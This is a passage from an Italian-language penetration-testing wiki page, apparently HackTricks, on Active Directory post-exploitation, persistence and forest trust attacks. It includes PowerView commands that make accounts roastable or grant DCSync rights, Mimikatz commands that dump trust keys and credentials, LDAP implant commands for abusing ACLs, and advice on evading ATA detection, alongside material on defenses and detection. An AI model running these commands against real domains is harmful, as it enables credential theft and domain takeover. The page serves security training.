Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e persino **iniettare beacon nei loro processi** per impersonarli.\
Di solito gli utenti accederanno al sistema tramite RDP, quindi qui trovi come eseguire un paio di attacchi sulle sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'amministratore locale** sui computer joined al dominio, assicurandone la **randomizzazione**, unicità e frequente **modifica**. Queste password sono archiviate in Active Directory e l'accesso è controllato tramite ACL solo per gli utenti autorizzati. Con privilegi sufficienti per accedere a queste password, diventa possibile fare pivot verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per escalare privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **template vulnerabili**, è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi **Domain Admin** o, ancora meglio, **Enterprise Admin**, puoi fare **dump** del **database di dominio**: _ntds.dit_.

[**Più informazioni sull'attacco DCSync si possono trovare qui**](dcsync.md).

[**Più informazioni su come rubare NTDS.dit si possono trovare qui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per la persistenza.\
Per esempio, potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi **[DCSync](#dcsync)** a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'attacco **Silver Ticket** crea un **ticket Ticket Granting Service (TGS) legittimo** per un servizio specifico usando l'**hash NTLM** (per esempio, l'**hash dell'account del PC**). Questo metodo viene usato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un attacco **Golden Ticket** consiste nell'ottenere accesso all'**hash NTLM dell'account krbtgt** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, che sono essenziali per l'autenticazione nella rete AD.

Una volta ottenuto questo hash, l'attaccante può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Sono come golden tickets forgiati in un modo che **aggira i comuni meccanismi di rilevamento dei golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Avere certificati di un account o poterli richiedere** è un ottimo modo per poter mantenere la persistenza nell'account utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Usare i certificati rende anche possibile mantenere la persistenza con privilegi elevati all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'oggetto **AdminSDHolder** in Active Directory garantisce la sicurezza dei **gruppi privilegiati** (come Domain Admins ed Enterprise Admins) applicando una standard **Access Control List (ACL)** su questi gruppi per impedire modifiche non autorizzate. Tuttavia, questa funzionalità può essere sfruttata; se un attaccante modifica l'ACL di AdminSDHolder per dare accesso completo a un utente normale, quell'utente ottiene un controllo esteso su tutti i gruppi privilegiati. Questa misura di sicurezza, pensata per proteggere, può quindi ritorcersi contro, consentendo accessi non autorizzati se non viene monitorata attentamente.

[**Più informazioni sul gruppo AdminDSHolder qui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro ogni **Domain Controller (DC)** esiste un account di **amministratore locale**. Ottenendo diritti di admin su una macchina del genere, l'hash dell'Administrator locale può essere estratto usando **mimikatz**. Dopodiché, è necessaria una modifica del registro per **abilitare l'uso di questa password**, consentendo l'accesso remoto all'account Administrator locale.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Potresti **concedere** alcuni **permessi speciali** a un **utente** su alcuni oggetti di dominio specifici, permettendo all'utente di **escalare privilegi in futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

I **security descriptors** sono usati per **memorizzare** i **permessi** che un **oggetto** ha **su** un oggetto. Se riesci a **fare** solo una **piccola modifica** nel **security descriptor** di un oggetto, puoi ottenere privilegi molto interessanti su quell'oggetto senza dover far parte di un gruppo privilegiato.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abusa della classe ausiliaria `dynamicObject` per creare principal/GPO/record DNS di breve durata con `entryTTL`/`msDS-Entry-Time-To-Die`; si autoeliminano senza tombstone, cancellando le evidenze LDAP e lasciando SID orfani, riferimenti `gPLink` rotti o risposte DNS in cache (ad esempio, inquinamento di ACE di AdminSDHolder o redirect malevoli `gPCFileSysPath`/DNS integrato in AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** in memoria per stabilire una **password universale**, concedendo accesso a tutti gli account di dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Scopri qui cos'è un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puoi creare il tuo **SSP** per **catturare** in **testo in chiaro** le **credenziali** usate per accedere alla macchina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuovo Domain Controller** nell'AD e lo usa per **iniettare attributi** (SIDHistory, SPNs...) su oggetti specificati **senza** lasciare alcun **log** relativo alle **modifiche**. Ti **servono** privilegi DA e devi essere nel **dominio root**.\
Nota che se usi dati errati, appariranno log piuttosto brutti.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

In precedenza abbiamo parlato di come escalare privilegi se hai **permessi sufficienti per leggere le password LAPS**. Tuttavia, queste password possono anche essere usate per **mantenere la persistenza**.\
Controlla:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera il **Forest** come il confine di sicurezza. Questo implica che **compromettere un singolo dominio potrebbe potenzialmente portare al compromesso dell'intero Forest**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) è un meccanismo di sicurezza che consente a un utente di un **dominio** di accedere alle risorse in un altro **dominio**. In pratica crea un collegamento tra i sistemi di autenticazione dei due domini, consentendo alle verifiche di autenticazione di fluire senza interruzioni. Quando i domini configurano un trust, si scambiano e conservano specifiche **chiavi** nei loro **Domain Controller (DCs)**, che sono cruciali per l'integrità del trust.

In uno scenario tipico, se un utente intende accedere a un servizio in un **dominio trusted**, deve prima richiedere un ticket speciale noto come **inter-realm TGT** dal DC del proprio dominio. Questo TGT è cifrato con una **chiave** condivisa che entrambi i domini hanno concordato. L'utente presenta poi questo TGT al **DC del dominio trusted** per ottenere un ticket di servizio (**TGS**). Dopo la corretta convalida dell'inter-realm TGT da parte del DC del dominio trusted, viene emesso un TGS, concedendo all'utente accesso al servizio.

**Passaggi**:

1. Un **computer client** nel **Domain 1** avvia il processo usando il proprio **hash NTLM** per richiedere un **Ticket Granting Ticket (TGT)** al suo **Domain Controller (DC1)**.
2. DC1 emette un nuovo TGT se il client viene autenticato con successo.
3. Il client richiede poi un **inter-realm TGT** a DC1, necessario per accedere alle risorse in **Domain 2**.
4. L'inter-realm TGT è cifrato con una **trust key** condivisa tra DC1 e DC2 nell'ambito del trust bidirezionale tra domini.
5. Il client porta l'inter-realm TGT al **Domain Controller (DC2) di Domain 2**.
6. DC2 verifica l'inter-realm TGT usando la trust key condivisa e, se valido, emette un **Ticket Granting Service (TGS)** per il server in Domain 2 a cui il client vuole accedere.
7. Infine, il client presenta questo TGS al server, che è cifrato con l'hash dell'account del server, per ottenere accesso al servizio in Domain 2.

### Different trusts

È importante notare che **un trust può essere a 1 via o a 2 vie**. Nell'opzione a 2 vie, entrambi i domini si fidano l'uno dell'altro, mentre nella relazione di trust a **1 via** uno dei domini sarà il **trusted** e l'altro il dominio **trusting**. Nell'ultimo caso, **sarai in grado di accedere solo alle risorse all'interno del dominio trusting a partire da quello trusted**.

Se Domain A trusts Domain B, A è il dominio trusting e B è quello trusted. Inoltre, in **Domain A**, questo sarebbe un **Outbound trust**; e in **Domain B**, sarebbe un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Questa è una configurazione comune all'interno dello stesso forest, in cui un child domain ha automaticamente un trust transitive bidirezionale con il suo parent domain. In sostanza, significa che le richieste di autenticazione possono fluire senza problemi tra il parent e il child.
- **Cross-link Trusts**: Chiamati "shortcut trusts", vengono stabiliti tra child domains per velocizzare i referral process. Nei forest complessi, i referral di autenticazione devono di solito risalire fino alla forest root e poi scendere fino al domain di destinazione. Creando cross-link, il percorso si accorcia, il che è particolarmente utile in ambienti geograficamente distribuiti.
- **External Trusts**: Vengono configurati tra domini diversi e non correlati e sono, per natura, non transitive. Secondo la [documentazione di Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), gli external trust sono utili per accedere a risorse in un dominio fuori dal forest corrente che non è collegato da un forest trust. La sicurezza viene rafforzata tramite SID filtering con gli external trust.
- **Tree-root Trusts**: Questi trust vengono stabiliti automaticamente tra il forest root domain e una nuova tree root aggiunta. Anche se non si incontrano di frequente, i tree-root trust sono importanti per aggiungere nuovi domain tree a un forest, consentendo loro di mantenere un nome di dominio unico e garantendo la transitività bidirezionale. Maggiori informazioni si trovano nella [guida di Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Questo tipo di trust è un trust transitive bidirezionale tra due forest root domain, che applica anche SID filtering per aumentare le misure di sicurezza.
- **MIT Trusts**: Questi trust vengono stabiliti con Kerberos domain non Windows, conformi a [RFC4120](https://tools.ietf.org/html/rfc4120). I MIT trust sono un po' più specializzati e si rivolgono ad ambienti che richiedono integrazione con sistemi basati su Kerberos al di fuori dell'ecosistema Windows.

#### Other differences in **trusting relationships**

- Una trust relationship può anche essere **transitive** (A trust B, B trust C, allora A trust C) oppure **non-transitive**.
- Una trust relationship può essere configurata come **bidirectional trust** (entrambi si fidano l'uno dell'altro) oppure come **one-way trust** (solo uno dei due si fida dell'altro).

### Attack Path

1. **Enumerare** le trusting relationships
2. Verificare se qualche **security principal** (utente/gruppo/computer) ha **accesso** alle risorse dell'**altro dominio**, magari tramite entry ACE o perché appartiene a gruppi dell'altro dominio. Cerca **relazioni tra domini** (probabilmente il trust è stato creato proprio per questo).
1. kerberoast in questo caso potrebbe essere un'altra opzione.
3. **Compromettere** gli **account** che possono fare **pivot** tra domini.

Gli attacker con accesso alle risorse in un altro dominio possono farlo tramite tre meccanismi principali:

- **Local Group Membership**: I principal possono essere aggiunti a gruppi locali su macchine, come il gruppo “Administrators” su un server, ottenendo così un controllo significativo su quella macchina.
- **Foreign Domain Group Membership**: I principal possono anche essere membri di gruppi all'interno del foreign domain. Tuttavia, l'efficacia di questo metodo dipende dalla natura del trust e dall'ambito del gruppo.
- **Access Control Lists (ACLs)**: I principal possono essere specificati in una **ACL**, in particolare come entità in **ACEs** all'interno di una **DACL**, fornendo accesso a risorse specifiche. Per chi vuole approfondire il funzionamento di ACL, DACL e ACE, il whitepaper intitolato “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” è una risorsa preziosa.

### Find external users/groups with permissions

Puoi controllare **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** per trovare foreign security principals nel dominio. Questi saranno user/group da **un dominio/forest esterno**.

Puoi controllarlo in **Bloodhound** o usando powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalatione di privilegi da Child a Parent forest
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Altri modi per enumerare le trust del dominio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Ci sono **2 trusted keys**, una per _Child --> Parent_ e un'altra per _Parent_ --> _Child_.\
> Puoi quella usata dal dominio corrente con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escalate come Enterprise admin al child/parent domain abusando del trust con SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Capire come la Configuration Naming Context (NC) può essere sfruttata è fondamentale. La Configuration NC funge da repository centrale per i dati di configurazione in tutto un forest negli ambienti Active Directory (AD). Questi dati vengono replicati su ogni Domain Controller (DC) all'interno del forest, con i DC scrivibili che mantengono una copia scrivibile della Configuration NC. Per sfruttarlo, bisogna avere **privilegi SYSTEM su un DC**, preferibilmente un child DC.

**Link GPO to root DC site**

Il container Sites della Configuration NC include informazioni sui site di tutti i computer joined al domain all'interno del forest AD. Operando con privilegi SYSTEM su qualsiasi DC, gli attacker possono linkare GPO ai root DC site. Questa azione può compromettere il root domain manipolando le policy applicate a questi site.

Per informazioni approfondite, si può consultare la ricerca su [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vettore di attack coinvolge il targeting di gMSA privilegiati nel domain. La KDS Root key, essenziale per calcolare le password delle gMSA, è archiviata nella Configuration NC. Con privilegi SYSTEM su qualsiasi DC, è possibile accedere alla KDS Root key e calcolare le password per qualsiasi gMSA in tutto il forest.

Un'analisi dettagliata e una guida passo-passo si trovano in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attack delegato MSA complementare (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ricerca esterna aggiuntiva: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Questo metodo richiede pazienza, aspettando la creazione di nuovi AD objects privilegiati. Con privilegi SYSTEM, un attacker può modificare lo AD Schema per concedere a qualsiasi user il controllo completo su tutte le classi. Questo potrebbe portare ad accesso non autorizzato e controllo dei nuovi AD objects creati.

Ulteriori approfondimenti sono disponibili su [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnerabilità ADCS ESC5 mira al controllo degli oggetti Public Key Infrastructure (PKI) per creare un certificate template che consenta l'autenticazione come qualsiasi user all'interno del forest. Poiché gli oggetti PKI risiedono nella Configuration NC, compromettere un child DC scrivibile abilita l'esecuzione di attack ESC5.

Ulteriori dettagli si possono leggere in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenari privi di ADCS, l'attacker ha la capacità di configurare i componenti necessari, come discusso in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In questo scenario **il tuo dominio è trusted** da uno esterno, concedendoti **permessi indeterminati** su di esso. Dovrai trovare **quali principal del tuo dominio hanno quale accesso sul dominio esterno** e poi cercare di sfruttarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In questo scenario **your domain** sta **concedendo** alcuni **privileges** a principal di **domini diversi**.

Tuttavia, quando un **domain is trusted** dal trusting domain, il trusted domain **crea un user** con un **nome prevedibile** che usa come **password the trusted password**. Ciò significa che è possibile **accedere a un user from the trusting domain to get inside the trusted one** per enumerarlo e provare a elevare ulteriormente i privilegi:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Un altro modo per compromettere il trusted domain è trovare un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creato nella **direzione opposta** rispetto al domain trust (cosa che non è molto comune).

Un altro modo per compromettere il trusted domain è aspettare in una macchina dove un **user from the trusted domain can access** per fare login via **RDP**. Poi, l'attacker potrebbe iniettare codice nel processo della sessione RDP e **access the origin domain of the victim** da lì.\
Inoltre, se la **victim mounted his hard drive**, dal processo della **RDP session** l'attacker potrebbe memorizzare **backdoors** nella **startup folder of the hard drive**. Questa tecnica si chiama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Il rischio di attacchi che sfruttano l'attributo SID history attraverso i forest trust viene mitigato da SID Filtering, che è attivato di default su tutti i trust inter-forest. Questo si basa sull'assunzione che i trust intra-forest siano sicuri, considerando il forest, piuttosto che il domain, come security boundary secondo la posizione di Microsoft.
- Tuttavia, c'è un problema: SID filtering potrebbe interrompere applicazioni e accesso degli user, portando alla sua disattivazione occasionale.

### **Selective Authentication:**

- Per i trust inter-forest, l'uso di Selective Authentication garantisce che gli user dei due forest non vengano autenticati automaticamente. Invece, sono necessari permessi espliciti affinché gli user possano accedere a domains e servers all'interno del trusting domain o forest.
- È importante notare che queste misure non proteggono dallo sfruttamento del writable Configuration Naming Context (NC) o da attacchi all'account del trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) re-implements bloodyAD-style LDAP primitives as x64 Beacon Object Files that run entirely inside an on-host implant (e.g., Adaptix C2). Operators compile the pack with `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, load `ldap.axs`, and then call `ldap <subcommand>` from the beacon. All traffic rides the current logon security context over LDAP (389) with signing/sealing or LDAPS (636) with auto certificate trust, so no socks proxies or disk artifacts are required.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` resolve short names/OU paths into full DNs and dump the corresponding objects.
- `get-object`, `get-attribute`, and `get-domaininfo` pull arbitrary attributes (including security descriptors) plus the forest/domain metadata from `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` expose roasting candidates, delegation settings, and existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors directly from LDAP.
- `get-acl` and `get-writable --detailed` parse the DACL to list trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), and inheritance, giving immediate targets for ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitive LDAP di scrittura per escalation & persistence

- I BOF di creazione oggetti (`add-user`, `add-computer`, `add-group`, `add-ou`) permettono all’operatore di predisporre nuovi principal o account macchina ovunque esistano diritti sulle OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` dirottano direttamente i target una volta trovati i diritti di scrittura sugli attributi.
- Comandi focalizzati su ACL come `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync` traducono WriteDACL/WriteOwner su qualsiasi oggetto AD in reset delle password, controllo dell’appartenenza ai gruppi o privilegi di replica DCSync senza lasciare artefatti PowerShell/ADSI. I corrispettivi `remove-*` ripuliscono gli ACE iniettati.

### Delegation, roasting e abuso di Kerberos

- `add-spn`/`set-spn` rendono subito Kerberoastable un utente compromesso; `add-asreproastable` (toggle UAC) lo marca per AS-REP roasting senza toccare la password.
- Le macro di delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) riscrivono `msDS-AllowedToDelegateTo`, i flag UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` dal beacon, abilitando percorsi di attacco constrained/unconstrained/RBCD ed eliminando la necessità di remote PowerShell o RSAT.

### sidHistory injection, relocation delle OU e shaping della superficie d’attacco

- `add-sidhistory` inietta SID privilegiati nella SID history di un principal controllato (vedi [SID-History Injection](sid-history-injection.md)), fornendo un’inheritance di accesso stealthy interamente via LDAP/LDAPS.
- `move-object` cambia il DN/OU di computer o utenti, permettendo a un attaccante di trascinare gli asset in OU dove esistono già diritti delegati prima di abusare di `set-password`, `add-groupmember` o `add-spn`.
- I comandi di rimozione strettamente mirati (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ecc.) consentono un rapido rollback dopo che l’operatore ha raccolto credenziali o persistence, minimizzando la telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Scopri di più su come proteggere le credenziali qui.**](../stealing-credentials/credentials-protections.md)

### **Misure Difensive per la Protezione delle Credenziali**

- **Restrizioni per i Domain Admins**: Si raccomanda che ai Domain Admins sia consentito accedere solo ai Domain Controllers, evitando il loro uso su altri host.
- **Privilegi degli account di servizio**: I servizi non dovrebbero essere eseguiti con privilegi Domain Admin (DA) per mantenere la sicurezza.
- **Limitazione temporale dei privilegi**: Per attività che richiedono privilegi DA, la loro durata dovrebbe essere limitata. Questo può essere ottenuto con: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigazione LDAP relay**: Esamina gli Event ID 2889/3074/3075 e poi applica LDAP signing più LDAPS channel binding su DCs/client per bloccare tentativi di LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting a livello di protocollo dell’attività di Impacket

Se vuoi rilevare le comuni tradecraft AD, **non basarti solo sugli artefatti controllati dall’operatore** come binari rinominati, nomi di servizi, file batch temporanei o percorsi di output. Prendi come baseline il modo in cui i client Windows legittimi generano traffico [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI, poi cerca **quirk di implementazione** che restano anche dopo che l’operatore modifica `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` o `ntlmrelayx.py`.

- **Candidati standalone ad alta confidenza** (dopo la validazione contro la tua baseline):
- DCE/RPC autenticato con `auth_context_id = 79231 + ctx_id`
- Padding di autenticazione DCE/RPC riempito con `0xff`
- LDAP Kerberos bind che inseriscono un `AP-REQ` Kerberos grezzo direttamente in SPNEGO `mechToken`
- Richieste SMB2/3 negotiate con valori `ClientGuid` dall’aspetto ASCII
- WMI `IWbemLevel1Login::NTLMLogin` che usa il namespace non standard `//./root/cimv2`
- Valori hardcoded del nonce Kerberos
- **Meglio come feature di correlazione/scoring**:
- Liste di etype Kerberos sparse o duplicate, `PA-DATA` insoliti/mancanti, oppure ordering degli etype nelle TGS-REQ diverso da Windows nativo
- Messaggi NTLM Type 1 senza informazioni di versione o messaggi Type 3 con nomi host nulli
- NTLMSSP grezzo trasportato in DCE/RPC invece che in SPNEGO, trailer di verifica DCE/RPC mancanti, o mismatch tra OID SPNEGO/Kerberos
- Più di questi tratti dallo stesso host/user/session/time window sono molto più forti di qualsiasi singolo campo debole
- **Usali come enrichment, non come alert standalone**:
- Nomi file predefiniti, percorsi di output, nomi di servizi casuali, nomi batch temporanei, nomi di account computer predefiniti e stringhe HTTP/WebDAV/RDP/MSSQL specifiche del tool
- Sono facili da cambiare per gli operatori e sono meglio usati per spiegare perché un cluster cross-protocol è sospetto
- **Note operative**:
- Alcuni di questi segnali richiedono traffico decrittato, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW o visibilità lato servizio
- Valida contro client Samba/Linux, appliance e software legacy prima di promuoverli ad alert
- Promuovi le detection da enrichment -> hunting -> alerting man mano che costruisci fiducia nella baseline

### **Implementing Deception Techniques**

- Implementare deception implica predisporre trappole, come utenti o computer esca, con caratteristiche come password che non scadono o che sono marcati come Trusted for Delegation. Un approccio dettagliato include la creazione di utenti con diritti specifici o la loro aggiunta a gruppi ad alto privilegio.
- Un esempio pratico prevede l’uso di strumenti come: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Maggiori informazioni sul deployment di tecniche di deception si trovano su [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Per gli oggetti User**: indicatori sospetti includono ObjectSID atipici, logon infrequenti, date di creazione e bassi conteggi di bad password.
- **Indicatori generali**: confrontare gli attributi dei potenziali oggetti esca con quelli di oggetti reali può rivelare incongruenze. Strumenti come [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) possono aiutare a identificare queste deception.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: evitare la enumerazione delle sessioni sui Domain Controllers per prevenire il rilevamento di ATA.
- **Ticket Impersonation**: l’uso di chiavi **aes** per la creazione dei ticket aiuta a eludere il rilevamento evitando il downgrade a NTLM.
- **DCSync Attacks**: è consigliato eseguirli da un host non-Domain Controller per evitare il rilevamento di ATA, poiché l’esecuzione diretta da un Domain Controller attiverà gli alert.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)

{{#include ../../banners/hacktricks-training.md}}
